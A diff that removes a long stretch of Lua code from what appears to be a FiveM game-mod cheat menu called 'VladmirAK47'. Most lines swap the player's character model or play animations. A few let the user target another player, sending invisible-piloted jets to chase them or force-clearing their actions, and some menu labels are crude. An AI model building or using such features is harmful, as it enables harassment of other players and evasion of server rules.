-                                local ped = CreatePed(21, GetHashKey('s_f_y_bartender_01'), pos.x, pos.y, pos.z, true, true)
-								local ped1 = CreatePed(21, GetHashKey('s_f_y_bartender_01'), pos.x, pos.y, pos.z, true, true)								
-                                if DoesEntityExist(ped) and DoesEntityExist(ped1) then
-                                    SetPedIntoVehicle(ped, v, -1)
-									SetPedIntoVehicle(ped1, v1, -1)
-									SetEntityVisible(ped, false, true)
-									TaskPlaneChase(ped, target, 100.00, 786468)
-                                    TaskPlaneChase(ped1, target, 100.00, 786468)										
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-                                end
-                            end
-                        end
-                    end		
-				  elseif VladmirAK47.Button('~h~Exit ~s~Vehicle') then
-				  local target = PlayerPedId(SelectedPlayer)
-				  ClearPedTasksImmediately(target)
-				 elseif VladmirAK47.Button('~h~Random clothes') then
-                if not skin1 then
-                 skin1 = true
-                        av('~h~~b~on~.', false)
-                else
-                 skin1 = false
-                        av('~h~~b~Off.', false)
-                end	
-                elseif VladmirAK47.Button('~h~Suicide') then
-                    SetEntityHealth(PlayerPedId(-1), 0)
-                elseif VladmirAK47.Button("~h~Heal") then
-                    SetEntityHealth(PlayerPedId(-1), 200)
-                elseif VladmirAK47.Button("~h~Armour") then
-                    SetPedArmour(PlayerPedId(-1), 200)
-                end					
-								VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('SuperPower') then
-                if VladmirAK47.Button('~h~Go back to Normal') then 
-				local playerPed = GetPlayerPed(-1)
-				SetPedRandomComponentVariation(PlayerPedId(), true)
-				SetEntityMaxHealth(playerPed, 200);
-				SetPedMaxHealth(playerPed, 200);
-				SetEntityHealth(playerPed, 200);
-				ResetPedMovementClipset(playerPed, 1.0);
-				ResetPedStrafeClipset(playerPed);
-                SetPedUsingActionMode(playerPed, true, 0, 0)
-                RemoveWeaponFromPed(playerPed, 0x42BF8A85)				
-                elseif VladmirAK47.Button('~h~Juggernaut ') then 
-				Jugg(player)
-                av('~h~~b~Use your Minigun.', false)
-                elseif VladmirAK47.Button('~h~Skate Boarding') then
-					  StartSkating2()
-					av('~h~~b~Press "HOME" to stop press', false)  			
-                elseif VladmirAK47.Button('~h~Sky Diving') then
-                      --EquipSkateboard()
-					  IRON1()
-					av('~h~~b~Press "HOME" for effect', false) 				
-                end					
-								VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('Animations') then
-				if VladmirAK47.Button('~h~Clear Animations ') then
-				  local target = PlayerPedId(SelectedPlayer)
-				  ClearPedTasksImmediately(target)			
-                elseif VladmirAK47.Button('~h~Sex Receiver') then
-				RequestAnimDict('rcmpaparazzo_2')
-				Citizen.Wait(200)
-                if HasAnimDictLoaded('rcmpaparazzo_2') then				
-				TaskPlayAnim(PlayerPedId(-1), 'rcmpaparazzo_2', 'shag_loop_poppy', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
-				end
-                elseif VladmirAK47.Button('~h~Sex Giver') then
-				RequestAnimDict('rcmpaparazzo_2')
-				Citizen.Wait(200)
-                if HasAnimDictLoaded('rcmpaparazzo_2') then				
-				TaskPlayAnim(PlayerPedId(-1), 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
-				end
-                elseif VladmirAK47.Button('~h~Gay Dance') then
-				RequestAnimDict('mini@strip_club@private_dance@part1')
-				Citizen.Wait(200)
-                if HasAnimDictLoaded('mini@strip_club@private_dance@part1') then				
-				TaskPlayAnim(PlayerPedId(-1), 'mini@strip_club@private_dance@part1', 'priv_dance_p1', 2.0, 2.5, -1, 49, 0, 0, 0, 0)			
-                end
-                elseif VladmirAK47.Button('~h~Turning around') then
-				RequestAnimDict('mini@strip_club@pole_dance@pole_dance1')
-				Citizen.Wait(200)
-                if HasAnimDictLoaded('mini@strip_club@pole_dance@pole_dance1') then				
-				TaskPlayAnim(PlayerPedId(-1), 'mini@strip_club@pole_dance@pole_dance1', 'pd_dance_01', 2.0, 2.5, -1, 49, 0, 0, 0, 0)			
-                end
-                elseif VladmirAK47.Button('~h~Celebrate') then
-				RequestAnimDict('rcmfanatic1celebrate')
-				Citizen.Wait(200)
-                if HasAnimDictLoaded('rcmfanatic1celebrate') then				
-				TaskPlayAnim(PlayerPedId(-1), 'rcmfanatic1celebrate', 'celebrate', 2.0, 2.5, -1, 49, 0, 0, 0, 0)			
-                end
-                elseif VladmirAK47.Button('~h~Electrocution') then
-				RequestAnimDict('ragdoll@human')
-				Citizen.Wait(200)
-                if HasAnimDictLoaded('ragdoll@human') then				
-				TaskPlayAnim(PlayerPedId(-1), 'ragdoll@human', 'electrocute', 2.0, 2.5, -1, 49, 0, 0, 0, 0)			
-				end
-                elseif VladmirAK47.Button('~h~Suicide') then
-				RequestAnimDict('mp_suicide')
-				Citizen.Wait(200)
-                if HasAnimDictLoaded('mp_suicide') then				
-				TaskPlayAnim(PlayerPedId(-1), 'mp_suicide', 'pistol', 2.0, 2.5, -1, 49, 0, 0, 0, 0)			
-				end
-                elseif VladmirAK47.Button('~h~Shower') then
-				RequestAnimDict('mp_safehouseshower@male@')
-				Citizen.Wait(200)
-                if HasAnimDictLoaded('mp_safehouseshower@male@') then				
-				TaskPlayAnim(PlayerPedId(-1), 'mp_safehouseshower@male@', 'male_shower_idle_b', 2.0, 2.5, -1, 49, 0, 0, 0, 0)			
-				end	
-                elseif VladmirAK47.Button('~h~Dog Pissing') then
-				RequestAnimDict('creatures@rottweiler@move')
-				Citizen.Wait(200)
-                if HasAnimDictLoaded('creatures@rottweiler@move') then				
-				TaskPlayAnim(PlayerPedId(-1), 'creatures@rottweiler@move', 'pee_right_idle', 2.0, 2.5, -1, 49, 0, 0, 0, 0)			
-				end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('Ride') then
-                if VladmirAK47.Button('~h~Stop Ride') then
-					local target = GetPlayerPed(-1)
-                     Deer.Destroy()				 
-                elseif VladmirAK47.Button('~h~Dear') then
-                     Deer.Create()
-					 Citizen.Wait(10)
-                     Deer.Attach()
-                elseif VladmirAK47.Button('~h~Cow') then
-                     Deer.Create1()
-					 Citizen.Wait(10)
-                     Deer.Attach()
-                elseif VladmirAK47.Button('~h~Pig') then
-                     Deer.Create2()
-					 Citizen.Wait(10)
-                     Deer.Attach()
-                elseif VladmirAK47.Button('~h~Monkey') then
-                     Deer.Create3()
-					 Citizen.Wait(10)
-                     Deer.Attach()	
-                elseif VladmirAK47.Button('~h~Chop') then
-                     Deer.Create4()
-					 Citizen.Wait(10)
-                     Deer.Attach()	
-                elseif VladmirAK47.Button('~h~Cormorant') then
-                     Deer.Create5()
-					 Citizen.Wait(10)
-                     Deer.Attach()	
-                elseif VladmirAK47.Button('~h~Coyote') then
-                     Deer.Create6()
-					 Citizen.Wait(10)
-                     Deer.Attach()	
-                elseif VladmirAK47.Button('~h~Huskey') then
-                     Deer.Create7()
-					 Citizen.Wait(10)
-                     Deer.Attach()	
-                elseif VladmirAK47.Button('~h~Lion') then
-                     Deer.Create8()
-					 Citizen.Wait(10)
-                     Deer.Attach()	
-                elseif VladmirAK47.Button('~h~Rat') then
-                     Deer.Create9()
-					 Citizen.Wait(10)
-                     Deer.Attach()						 
-                end					
-				
-								VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('SkinChange') then
-                if VladmirAK47.Button('~c~~h~Model~s~ Clown') then
-							local model = "s_m_y_clown_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Mime') then
-							local model = "S_M_Y_Mime"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Stripper') then
-			local model = "s_f_y_stripper_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Cop M') then
-			local model = "s_m_y_cop_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Cop F') then
-			local model = "MP_F_Cop_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Sheriff M') then
-			local model = "S_M_Y_Sheriff_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Sheriff F') then
-			local model = "S_F_Y_Sheriff_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model ~b~SWAT M') then
-			local model = "S_M_Y_Swat_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Armoured Ranger M') then
-			local model = "S_M_M_Armoured_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end	
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Ranger F') then
-			local model = "S_F_Y_Ranger_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end	
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Ranger Male') then
-			local model = "S_M_Y_Ranger_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Robot Ranger Male') then
-			local model = "U_M_Y_RSRanger_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Desert Army 01') then
-			local model = "G_M_Y_DesArmy_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Desert Army 02') then
-			local model = "G_M_Y_DesArmy_02"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Desert Army 03') then
-			local model = "G_M_Y_DesArmy_03"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Desert Army 04') then
-			local model = "G_M_Y_DesArmy_04"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Desert Army 05') then
-			local model = "G_M_Y_DesArmy_05"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Marine 01') then
-			local model = "S_M_Y_Marine_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end					
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Marine 02') then
-			local model = "S_M_Y_Marine_02"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Marine 03') then
-			local model = "S_M_Y_Marine_03"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Marine Commander') then
-			local model = "S_M_M_Marine_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Marine General') then
-			local model = "S_M_M_Marine_02"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Black OPS1 M') then
-			local model = "S_M_Y_BlackOps_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Black OPS2 M') then
-			local model = "S_M_Y_BlackOps_02"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Black OPS3 M') then
-			local model = "S_M_Y_BlackOps_03"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Prison Guard M') then
-			local model = "S_M_M_PrisGuard_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~b~ Paramedic M') then
-			local model = "S_M_M_Paramedic_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~y~ Vagos F') then
-			local model = "G_F_Y_Vagos_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~g~ Ramp Gang M') then
-			local model = "IG_Ramp_Gang"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~g~ Ramp Gang Boss M') then
-			local model = "CSB_Ramp_gang"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~g~ Fam Gang 01 M') then
-			local model = "MP_M_FamDD_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~g~ Fam Gang 02 M') then
-			local model = "G_M_Y_FamDNF_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~g~ Fam Gang Boss M') then
-			local model = "G_M_Y_FamCA_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~p~ Bella Gang 01 M') then
-			local model = "G_M_Y_BallaEast_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~p~ Bella Gang 02 M') then
-			local model = "G_M_Y_BallaSout_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~p~ Bella Gang 03 M') then
-			local model = "IG_BallasOG"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~p~ Bella Gang 04 M') then
-			local model = "IG_BallasOG"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~p~ Bella Gang F') then
-			local model = "G_F_Y_Ballas_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~p~ Bella Gang Boss M') then
-			local model = "G_M_Y_BallaOrig_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Jewel F') then
-			local model = "U_F_Y_JewelAss_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Jewel Thief') then
-			local model = "U_M_M_JewelThief"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~o~ Prisoner 01 M') then
-			local model = "S_M_Y_PrisMuscl_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~o~ Prisoner 02 M') then
-			local model = "S_M_Y_Prisoner_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~o~ Prisoner 03 M') then
-			local model = "U_M_Y_Prisoner_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Body Builder 01 M') then
-			local model = "A_M_Y_MusclBeac_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Body Builder 02 M') then
-			local model = "A_M_Y_MusclBeac_02"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Body Builder 03 M') then
-			local model = "A_M_Y_Surfer_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Body Builder 04 M') then
-			local model = "IG_TylerDix"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Body Builder 05 M') then
-			local model = "u_m_y_babyd"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Body Builder F') then
-			local model = "CS_MaryAnn"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Beach 01 F') then
-			local model = "A_F_M_Beach_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Beach 02 F') then
-			local model = "A_F_Y_Beach_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Beach Fat F') then
-			local model = "A_F_M_FatCult_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Female 01') then
-			local model = "A_F_Y_BevHills_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Female 02') then
-			local model = "A_F_Y_BevHills_02"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Female 03') then
-			local model = "A_F_Y_BevHills_03"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Female 04') then
-			local model = "A_F_Y_BevHills_04"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Female 05') then
-			local model = "CSB_Bride"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Female 06') then
-			local model = "U_F_Y_PoppyMich"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Female 07') then
-			local model = "A_F_Y_SouCent_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Female 08') then
-			local model = "CSB_Anita"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Skater Female') then
-			local model = "A_F_Y_Skater_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Old Man') then
-			local model = "U_M_O_TapHillBilly"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Guy 01') then
-			local model = "S_M_Y_Barman_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Guy 02') then
-			local model = "A_M_Y_BreakDance_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Guy 03') then
-			local model = "U_M_Y_Chip"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Guy 04') then
-			local model = "U_M_Y_GunVend_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Guy 05') then
-			local model = "CSB_Groom"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Rich Guy 06') then
-			local model = "A_M_Y_Business_02"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Chinese M 01') then
-			local model = "G_M_M_ChiBoss_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Chinese M 02') then
-			local model = "G_M_M_ChiGoon_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Chinese M 03') then
-			local model = "G_M_M_ChiGoon_02"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Chinese M 04') then
-			local model = "CSB_Hao"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Chinese F') then
-			local model = "A_F_Y_Vinewood_03"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Korean M 01') then
-			local model = "A_M_Y_KTown_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Korean M 02') then
-			local model = "A_M_Y_KTown_02"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Korean M 03') then
-			local model = "G_M_M_KorBoss_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Korean M 04') then
-			local model = "G_M_Y_Korean_01"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
-					SetPlayerModel(PlayerId(), GetHashKey(model))
-					end
-                elseif VladmirAK47.Button('~c~~h~Model~s~ Korean M 05') then
-			local model = "G_M_Y_Korean_02"
-				RequestModel(GetHashKey(model)) 
-				Wait(500)
-				if HasModelLoaded(GetHashKey(model)) then
